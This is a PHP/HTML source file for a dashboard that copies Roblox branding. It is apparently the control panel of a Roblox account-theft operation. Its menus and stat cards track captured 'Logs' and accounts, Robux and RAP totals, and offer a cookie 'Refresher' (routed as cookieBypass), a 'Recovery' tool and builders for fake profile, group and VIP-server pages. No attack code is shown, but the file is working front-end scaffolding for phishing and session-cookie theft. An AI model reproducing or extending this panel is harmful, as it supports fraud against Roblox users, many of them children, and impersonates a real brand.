<?php

session_start( );
require_once( $_SERVER[ "DOCUMENT_ROOT" ] . "/functional/account.php" );

$info = require_account( );
$avatar_url = discord_avatar_url( $info, 256 );
$display_name = $info[ "discord_username" ] ?? "User";
$display_level = "Lvl " . (int) ( $info[ "account_level" ] ?? 1 );
$display_rank = $info[ "account_rank" ] ?? "Noob";
$display_rank_class = rank_class_for_key( (string) ( $info[ "account_rank_key" ] ?? "default" ) );
$level_progress = (float) ( $info[ "account_level_progress" ] ?? user_level_info( $info )[ "progress" ] );
?>
<!DOCTYPE html>
<html lang="en-US" class="dark-theme">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="minimum-scale=1, initial-scale=1, width=device-width">
    <meta name="theme-color" content="#111216">
    <meta property="og:title" content="Creator Dashboard">
    <meta property="og:description" content="Make anything you can imagine. Everything you need to start building on Roblox for free; join a global community of Creators and publish instantly to the world.">
    <meta name="description" content="Make anything you can imagine. Everything you need to start building on Roblox for free; join a global community of Creators and publish instantly to the world.">
    <meta property="og:site_name" content="Creator Hub">
    <link rel="icon" type="image/svg+xml" href="https://cdn.foundation.roblox.com/current/roblox-tilt/favicon.svg">
    <link rel="icon" href="https://cdn.foundation.roblox.com/current/roblox-tilt/favicon.ico" sizes="48x48">
    <title>Roblox</title>
    <link rel="stylesheet" href="https://assets.create.roblox.com/f0ef4fb4752b938005c5424fea2d8be909d4e0a8/_next/static/chunks/06u52euuux792.css">
    <link rel="stylesheet" href="https://assets.create.roblox.com/f0ef4fb4752b938005c5424fea2d8be909d4e0a8/_next/static/chunks/06b9r6l127yzq.css">
    <link rel="stylesheet" href="https://assets.create.roblox.com/f0ef4fb4752b938005c5424fea2d8be909d4e0a8/_next/static/chunks/0skwat832wz88.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        indigo: {
                            300: "#6690ff",
                            400: "#4d7aff",
                            500: "#1446ff",
                            600: "#1446ff",
                            700: "#0f38d4",
                            800: "#0c2da8",
                            900: "#09227d",
                        },
                    },
                },
            },
        };
    </script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
    <style>
        html {
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            box-sizing: border-box;
            -webkit-text-size-adjust: 100%;
            -webkit-print-color-scheme: dark;
            color-scheme: dark;
        }
        *, *::before, *::after {
            box-sizing: inherit;
        }
        strong, b {
            font-weight: 700;
        }
        body {
            margin: 0;
            color: #ffffff;
            font-family: "Builder Sans", Helvetica, Arial, sans-serif;
            font-weight: 400;
            font-style: normal;
            font-size: 14px;
            line-height: 140%;
            background-color: #111216;
        }
        body::backdrop {
            background-color: #111216;
        }
    </style>
    <link rel="stylesheet" href="assets/css/dashboard.css?v=<?=rand( 99999, 999999999 );?>">
</head>
<body class="dash_page">
    <div class="dash_shell">
        <aside id="left_sidebar" class="dash_left_sidebar">
            <div class="dash_brand">
                <img src="assets/img/logo.svg" alt="Roblox">
                <span>Roblox</span>
            </div>

            <nav class="dash_nav">
                <p class="dash_section_title">Home</p>
                <hr>
                <div class="dash_nav_row" onclick="load_subpage('dashboard')">
                    <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 18 18"><path d="M6.143 0H1.857A1.857 1.857 0 0 0 0 1.857v4.286C0 7.169.831 8 1.857 8h4.286A1.857 1.857 0 0 0 8 6.143V1.857A1.857 1.857 0 0 0 6.143 0Zm10 0h-4.286A1.857 1.857 0 0 0 10 1.857v4.286C10 7.169 10.831 8 11.857 8h4.286A1.857 1.857 0 0 0 18 6.143V1.857A1.857 1.857 0 0 0 16.143 0Zm-10 10H1.857A1.857 1.857 0 0 0 0 11.857v4.286C0 17.169.831 18 1.857 18h4.286A1.857 1.857 0 0 0 8 16.143v-4.286A1.857 1.857 0 0 0 6.143 10Zm10 0h-4.286A1.857 1.857 0 0 0 10 11.857v4.286c0 1.026.831 1.857 1.857 1.857h4.286A1.857 1.857 0 0 0 18 16.143v-4.286A1.857 1.857 0 0 0 16.143 10Z"></path></svg>
                    <span>Dashboard</span>
                </div>

                <div class="dash_nav_row" onclick="load_subpage('logs')">
                    <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 18"><path d="M14 2a3.963 3.963 0 0 0-1.4.267 6.439 6.439 0 0 1-1.331 6.638A4 4 0 1 0 14 2Zm1 9h-1.264A6.957 6.957 0 0 1 15 15v2a2.97 2.97 0 0 1-.184 1H19a1 1 0 0 0 1-1v-1a5.006 5.006 0 0 0-5-5ZM6.5 9a4.5 4.5 0 1 0 0-9 4.5 4.5 0 0 0 0 9ZM8 10H5a5.006 5.006 0 0 0-5 5v2a1 1 0 0 0 1 1h11a1 1 0 0 0 1-1v-2a5.006 5.006 0 0 0-5-5Z"></path></svg>
                    <span>Logs</span>
                    <span class="dash_badge" id="logs_amount_sidebar"><?=(int) ( $info[ "statistics_accounts" ] ?? 0 );?></span>
                </div>

                <div class="dash_nav_row" onclick="load_subpage('visits')">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"></path></svg>
                    <span>Visits</span>
                    <span class="dash_badge" id="visits_amount_sidebar"><?=(int) ( $info[ "statistics_visits" ] ?? 0 );?></span>
                </div>

                <div class="dash_nav_row" onclick="load_subpage('settings')">
                    <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="m2.344 15.271 2 3.46a1 1 0 0 0 1.366.365l1.396-.806c.58.457 1.221.832 1.895 1.112V21a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1.598a8.094 8.094 0 0 0 1.895-1.112l1.396.806c.477.275 1.091.11 1.366-.365l2-3.46a1.004 1.004 0 0 0-.365-1.366l-1.372-.793a7.683 7.683 0 0 0-.002-2.224l1.372-.793c.476-.275.641-.89.365-1.366l-2-3.46a1 1 0 0 0-1.366-.365l-1.396.806A8.034 8.034 0 0 0 15 4.598V3a1 1 0 0 0-1-1h-4a1 1 0 0 0-1 1v1.598A8.094 8.094 0 0 0 7.105 5.71L5.71 4.904a.999.999 0 0 0-1.366.365l-2 3.46a1.004 1.004 0 0 0 .365 1.366l1.372.793a7.683 7.683 0 0 0 0 2.224l-1.372.793c-.476.275-.641.89-.365 1.366zM12 8c2.206 0 4 1.794 4 4s-1.794 4-4 4-4-1.794-4-4 1.794-4 4-4z"></path></svg>
                    <span>Settings</span>
                </div>

                <p class="dash_section_title">Tools</p>
                <hr>
                <div class="dash_nav_row" onclick="load_subpage('/misc/hyperLink')">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path d="M13.19 8.688a4.5 4.5 0 0 1 1.242 7.244l-4.5 4.5a4.5 4.5 0 0 1-6.364-6.364l1.757-1.757m13.35-.622 1.757-1.757a4.5 4.5 0 0 0-6.364-6.364l-4.5 4.5a4.5 4.5 0 0 0 1.242 7.244"></path></svg>
                    <span>Hyperlink</span>
                </div>
                <div class="dash_nav_row" onclick="load_subpage('/misc/cookieBypass')">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M13.5 10.5V6.75a4.5 4.5 0 1 1 9 0v3.75M3.75 21.75h10.5a2.25 2.25 0 0 0 2.25-2.25v-6.75a2.25 2.25 0 0 0-2.25-2.25H3.75a2.25 2.25 0 0 0-2.25 2.25v6.75a2.25 2.25 0 0 0 2.25 2.25Z"></path></svg>
                    <span>Refresher</span>
                </div>
                <div class="dash_nav_row" id="recovery" onclick="load_subpage('/misc/recovery')">
                    <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 18 16"><path stroke="currentColor" d="M12.5 8.5V7.5C12.5 6.94772 12.0523 6.5 11.5 6.5H1.5C0.947715 6.5 0.5 6.94772 0.5 7.5V13.5C0.5 14.0523 0.947715 14.5 1.5 14.5H11.5C12.0523 14.5 12.5 14.0523 12.5 13.5V12.5M12.5 8.5H8.5C7.39543 8.5 6.5 9.39543 6.5 10.5C6.5 11.6046 7.39543 12.5 8.5 12.5H12.5M12.5 8.5C13.6046 8.5 14.5 9.39543 14.5 10.5C14.5 11.6046 13.6046 12.5 12.5 12.5M3.5 6.5V3.5C3.5 1.84315 4.84315 0.5 6.5 0.5C8.15685 0.5 9.5 1.84315 9.5 3.5V6.5M12 10.5H13M10 10.5H11M8 10.5H9"></path></svg>
                    <span>Recovery</span>
                </div>

                <p class="dash_section_title">Create a Page</p>
                <hr>
                <div class="dash_nav_row" onclick="load_subpage('/create/profile')">
                    <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 18"><path d="M14 2a3.963 3.963 0 0 0-1.4.267 6.439 6.439 0 0 1-1.331 6.638A4 4 0 1 0 14 2Zm1 9h-1.264A6.957 6.957 0 0 1 15 15v2a2.97 2.97 0 0 1-.184 1H19a1 1 0 0 0 1-1v-1a5.006 5.006 0 0 0-5-5ZM6.5 9a4.5 4.5 0 1 0 0-9 4.5 4.5 0 0 0 0 9ZM8 10H5a5.006 5.006 0 0 0-5 5v2a1 1 0 0 0 1 1h11a1 1 0 0 0 1-1v-2a5.006 5.006 0 0 0-5-5Z"></path></svg>
                    <span>Profile</span>
                </div>
                <div class="dash_nav_row" onclick="load_subpage('/create/group')">
                    <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 20 18"><path d="M14 2a3.963 3.963 0 0 0-1.4.267 6.439 6.439 0 0 1-1.331 6.638A4 4 0 1 0 14 2Zm1 9h-1.264A6.957 6.957 0 0 1 15 15v2a2.97 2.97 0 0 1-.184 1H19a1 1 0 0 0 1-1v-1a5.006 5.006 0 0 0-5-5ZM6.5 9a4.5 4.5 0 1 0 0-9 4.5 4.5 0 0 0 0 9ZM8 10H5a5.006 5.006 0 0 0-5 5v2a1 1 0 0 0 1 1h11a1 1 0 0 0 1-1v-2a5.006 5.006 0 0 0-5-5Z"></path></svg>
                    <span>Group</span>
                </div>
                <div class="dash_nav_row" onclick="load_subpage('/create/vip')">
                    <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="m2.25 7.5 4.8 4.8a1.5 1.5 0 0 0 2.2-.12L12 8.25l2.75 3.93a1.5 1.5 0 0 0 2.2.12l4.8-4.8-2.25 11.25H4.5L2.25 7.5Z"></path></svg>
                    <span>VIP Server</span>
                </div>

            </nav>

            <div class="dash_sidebar_bottom">
                <div class="dash_nav_row" onclick="window.location.href='/control/sign-in/logout'">
                    <svg aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 18 16"><path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 8h11m0 0L8 4m4 4-4 4m4-11h3a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-3"></path></svg>
                    <span>Log Out</span>
                </div>
            </div>
        </aside>

        <div class="dash_main">
            <header class="dash_topbar dash_mobile_only">
                <div class="dash_topbar_left">
                    <button type="button" id="mobile_menu_btn" class="dash_icon_btn" aria-label="Open menu">
                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
                    </button>
                    <div class="dash_topbar_brand">
                        <img src="assets/img/logo.svg" alt="Roblox">
                        <span>Roblox</span>
                    </div>
                </div>
                <button type="button" id="mobile_chat_btn" class="dash_icon_btn" aria-label="Open chat">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z"></path></svg>
                </button>
            </header>

            <div class="dash_content_wrap">
                <div class="dash_content" id="content">
                    <div class="dash_stats">
                        <div class="dash_card">
                            <h2>Total Accounts</h2>
                            <div class="dash_stat_num" id="total_accounts">0</div>
                            <div class="dash_chart_canvas_wrap">
                                <canvas class="dash_weekly_chart" data-key="total_accounts"></canvas>
                            </div>
                        </div>

                        <div class="dash_card">
                            <h2>Total Visitors</h2>
                            <div class="dash_stat_num" id="total_visits">0</div>
                            <div class="dash_chart_canvas_wrap">
                                <canvas class="dash_weekly_chart" data-key="total_visits"></canvas>
                            </div>
                        </div>

                        <div class="dash_card">
                            <h2>Weekly Robux</h2>
                            <div class="dash_stat_num" id="weekly_robux">0</div>
                            <div class="dash_chart_canvas_wrap">
                                <canvas class="dash_weekly_chart" data-key="weekly_robux"></canvas>
                            </div>
                        </div>

                        <div class="dash_card">
                            <h2>Weekly Summary</h2>
                            <div class="dash_stat_num" id="weekly_summary">0</div>
                            <div class="dash_chart_canvas_wrap">
                                <canvas class="dash_weekly_chart" data-key="weekly_summary"></canvas>
                            </div>
                        </div>
                    </div>

                    <div class="dash_panel">
                        <div class="dash_panel_head">
                            <h2>Other Statistics</h2>
                            <p>Total RAP, Total Robux, and Summary are all charted for this week.</p>
                        </div>
                        <div class="dash_panel_charts">
                            <div class="dash_panel_chart">
                                <div class="dash_panel_chart_head"><span>Total RAP</span><strong id="data_rap">0</strong></div>
                                <div class="dash_chart_canvas_wrap dash_chart_canvas_wrap_compact">
                                    <canvas class="dash_weekly_chart" data-key="data_rap"></canvas>
                                </div>
                            </div>
                            <div class="dash_panel_chart">
                                <div class="dash_panel_chart_head"><span>Total Robux</span><strong id="data_robux">0</strong></div>
                                <div class="dash_chart_canvas_wrap dash_chart_canvas_wrap_compact">
                                    <canvas class="dash_weekly_chart" data-key="data_robux"></canvas>
                                </div>
                            </div>
                            <div class="dash_panel_chart">
                                <div class="dash_panel_chart_head"><span>Summary</span><strong id="data_summary">0</strong></div>
                                <div class="dash_chart_canvas_wrap dash_chart_canvas_wrap_compact">
                                    <canvas class="dash_weekly_chart" data-key="data_summary"></canvas>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <aside id="right_sidebar" class="dash_right_sidebar">
            <div class="dash_aside_head">
                <div class="dash_aside_user">
                    <img src="<?=htmlspecialchars( $avatar_url, ENT_QUOTES, "UTF-8" );?>" alt="Profile">
                    <div style="flex:1;min-width:0">
                        <div class="dash_aside_user_top">
                            <h2><?=htmlspecialchars( $display_name, ENT_QUOTES, "UTF-8" );?></h2>
                            <div class="dash_tags">
                                <span class="dash_tag"><?=htmlspecialchars( $display_level, ENT_QUOTES, "UTF-8" );?></span>
                                <span class="<?=htmlspecialchars( $display_rank_class, ENT_QUOTES, "UTF-8" );?>"><?=htmlspecialchars( $display_rank, ENT_QUOTES, "UTF-8" );?></span>
                            </div>
                        </div>
                        <div class="dash_progress" role="progressbar" aria-valuenow="<?=htmlspecialchars( (string) $level_progress, ENT_QUOTES, "UTF-8" );?>" aria-valuemin="0" aria-valuemax="1000"><span style="width:<?=htmlspecialchars( (string) $level_progress, ENT_QUOTES, "UTF-8" );?>%"></span></div>
                    </div>
                </div>
                <button type="button" id="close_chat_btn" class="dash_icon_btn dash_icon_btn_spaced dash_mobile_only" aria-label="Close chat">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" d="M6 18L18 6M6 6l12 12"></path></svg>
                </button>
            </div>

            <div class="dash_feed" id="live_chat"></div>

            <div class="dash_compose">
                <input type="text" id="message" placeholder="Message" autocomplete="off">
                <button type="button" id="send_message" class="dash_btn_send" aria-label="Send message">
                    <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"></path></svg>
                </button>
            </div>
        </aside>
    </div>

    <div id="mobile_overlay" class="dash_overlay dash_mobile_only"></div>
    <div id="dash_inline_subpages" style="display:none;">
        <div data-subpage="logs"><?php include __DIR__ . "/pages/logs.php"; ?></div>
        <div data-subpage="visits"><?php include __DIR__ . "/pages/visits.php"; ?></div>
        <div data-subpage="settings"><?php include __DIR__ . "/pages/settings.php"; ?></div>
        <div data-subpage="misc_hyperlink"><?php include __DIR__ . "/pages/misc/hyperlink.php"; ?></div>
        <div data-subpage="misc_cookiebypass"><?php include __DIR__ . "/pages/misc/refresher.php"; ?></div>
        <div data-subpage="misc_recovery"><?php include __DIR__ . "/pages/misc/recovery.php"; ?></div>
        <div data-subpage="create_profile"><?php include __DIR__ . "/pages/create/profile.php"; ?></div>
        <div data-subpage="create_group"><?php include __DIR__ . "/pages/create/group.php"; ?></div>
        <div data-subpage="create_vip"><?php include __DIR__ . "/pages/create/vip.php"; ?></div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdn.jsdelivr.net/npm/axios@1.7.9/dist/axios.min.js" defer></script>
    <script src="assets/js/dashboard.js?v=<?=rand( 99999, 999999999 );?>" defer></script>
</body>
</html>
